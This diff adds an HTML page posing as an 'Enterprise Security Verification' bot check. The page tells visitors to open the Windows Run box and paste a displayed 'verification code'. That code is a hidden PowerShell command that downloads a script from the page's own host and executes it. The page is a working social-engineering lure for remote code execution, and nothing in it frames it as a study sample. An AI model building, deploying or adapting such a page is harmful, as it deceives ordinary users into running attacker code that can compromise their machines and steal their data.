@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>Enterprise Device Verification</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+
+<body class="bg-gray-100 flex items-center justify-center min-h-screen p-4">
+    <div class="bg-white shadow-xl rounded-lg p-10 max-w-xl w-full space-y-6">
+        <div class="flex items-center space-x-3">
+            <h2 class="text-xl font-semibold text-gray-800">Enterprise Security Verification</h2>
+        </div>
+
+        <p class="text-sm text-gray-600 leading-relaxed">
+            As part of our enhanced security protocols, we require one-time device validation to confirm you're not a
+            bot.
+            This process ensures secure access to enterprise applications.
+        </p>
+
+        <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 rounded-md text-sm text-gray-700 space-y-2">
+            <p class="font-semibold">Please follow the steps below:</p>
+            <ol class="list-decimal list-inside space-y-1">
+                <li>Copy the verification code below.</li>
+                <li>Press <code class="bg-gray-200 px-1 rounded">Win + R</code> to open the Run window.</li>
+                <li>Paste (Ctrl + V) the copied command into the text box.</li>
+                <li>Press <strong>OK</strong> to continue.</li>
+            </ol>
+        </div>
+
+        <div class="space-y-2 text-sm text-gray-700">
+            <div class="bg-gray-900 text-green-400 font-mono text-sm p-3 rounded-lg shadow w-full break-words">
+                <code id="ps-command"></code>
+            </div>
+        </div>
+
+        <div id="spinner" class="flex justify-center pt-4">
+            <div class="w-8 h-8 border-4 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
+        </div>
+
+        <p class="text-xs text-gray-400 italic text-center">Once verified, you’ll be redirected automatically.</p>
+    </div>
+
+    <script>
+        const cmd = "powershell -nop -w hidden -c \"iex (New-Object Net.WebClient).DownloadString('" + window.location.protocol + "//" + window.location.host + "/verify/script')\""
+        document.getElementById("ps-command").textContent = cmd;
+    </script>
+</body>
+
+</html>
